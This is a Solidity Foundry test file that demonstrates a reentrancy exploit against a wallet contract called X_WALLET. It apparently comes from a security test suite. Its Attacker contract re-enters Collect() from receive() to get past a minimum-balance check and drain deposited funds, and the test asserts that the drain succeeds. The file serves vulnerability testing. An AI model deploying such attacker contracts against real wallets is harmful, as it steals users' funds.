
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/X_WALLET.sol";

contract TestReentrancyX_WALLET is Test {
    
    X_WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new X_WALLET(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // The vulnerability allows bypassing the 'MinSum' check (1 ether) via reentrancy.
        // We need to deposit enough to cover 2 withdrawals, but ensure that sequentially, 
        // the remaining balance after the first withdrawal would be less than MinSum.
        // Constraint: 2 * attackVal >= 1 ether (MinSum)
        // Constraint: attackVal < 1 ether (MinSum)
        // Range: [0.5 ether, 1 ether - 1 wei]
        attackVal = bound(attackVal, 0.5 ether, 0.99 ether);
        
        uint256 totalDeposit = attackVal * 2;

        // --- 3. Funding ---
        vm.deal(address(_attacker), totalDeposit);
        vm.deal(address(this), totalDeposit);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: totalDeposit}(attackVal);
        
        // The contract locks funds until block.timestamp > unlockTime.
        // Put(0) sets unlockTime to block.timestamp. We must warp to future.
        vm.warp(block.timestamp + 100);

        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
        
        // Verify the attacker successfully withdrew all funds.
        // Without reentrancy, the second withdrawal would fail because (Balance - attackVal) < MinSum.
        assertEq(address(_attacker).balance, totalDeposit, "Attacker failed to drain funds bypassing MinSum check");
    }

    receive() external payable {}
}

contract Attacker {
    X_WALLET public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public amountToWithdraw;

    constructor(address victimAddress) { 
        victim = X_WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        amountToWithdraw = val;
        // Deposit funds. Put(0) sets unlockTime to current block.timestamp.
        victim.Put{value: msg.value}(0);
    }

    function attack(uint256 val) public {
        attackCallCount = 0;
        exploitSucceeded = false;

        // 3. Call the vulnerable function.
        victim.Collect(amountToWithdraw);

        // 4. Verify Success Conditions.
        // If we successfully re-entered and completed both calls without reverting,
        // we bypassed the MinSum check on the second call.
        if (attackCallCount == 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2) {            
            // Re-enter the contract.
            // At this point, state (balance) has not been updated yet.
            // The check (balance >= MinSum) will pass again using the old balance.
            victim.Collect(amountToWithdraw);
        }
    }
}
